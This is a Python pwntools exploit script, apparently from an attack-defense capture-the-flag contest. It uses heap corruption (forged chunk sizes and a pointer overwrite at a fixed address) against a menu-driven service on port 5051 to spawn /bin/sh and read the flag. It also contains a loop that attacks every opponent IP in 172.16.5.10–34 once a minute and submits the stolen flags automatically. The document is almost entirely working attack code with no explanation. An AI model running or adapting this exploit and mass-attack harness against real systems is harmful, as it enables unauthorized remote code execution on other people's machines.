#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from submit import submit_flag
from time import sleep
import threading
import os
from team import team

PREFIX = '172.16.5.'
TIMEOUT = 3 #TODO
DELAY = 60
LIST = range(10, 35)
PORT = 5051
context.arch = 'amd64'
context.log_level = 'debug'


def exp(r,port):
    conn=remote(r,port, timeout=TIMEOUT)
    def add(s):
        conn.sendline("R")
        conn.sendafter("Input your string!\n",s)
        conn.recvuntil("SAVED!")
    def dele(index):
        conn.sendline("D")
        conn.sendlineafter("Input your index:\n",str(index))
        conn.recvuntil("FREED!")

    def edit(index,s):
        conn.sendline("C")
        conn.sendafter("Input your index:",str(index))
        conn.sendafter("input your new string(no longer than the old one)\n",s)

    add("a"*0x68)
    add("a"*0x68)
    dele(0)

    add("a"*0xf+"\x00")

    f={
        0x67:"\x00",
        0xf0:p64(0),
        0xf8:p64(0x71),
    }
    add(fit(f,filler="a"))
    edit(2,p64(0x6B63c0))
    edit(0,"\x70\x82")
    conn.sendline("R")
    conn.sendline("/bin/sh")
    conn.clean()
    conn.sendline("cat flag")
    flag = conn.recv()
    conn.close()
    return flag
def boom():
    context.log_level = 'info'
    while True:
        for i in LIST[::-1]:
            if i == 12:
                continue
            ip = PREFIX + str(i)
            print 'pwning %s' % ip
            try:
                submit_flag(exp(ip, PORT))
                success('pwned: %s %s' % (ip, team[ip]))
            except :
                warning('failed: %s %s' % (ip, team[ip]))
        sleep(DELAY)
if len(sys.argv) > 2:
    submit_flag(exp(sys.argv[1], sys.argv[2]))
else:
    boom()
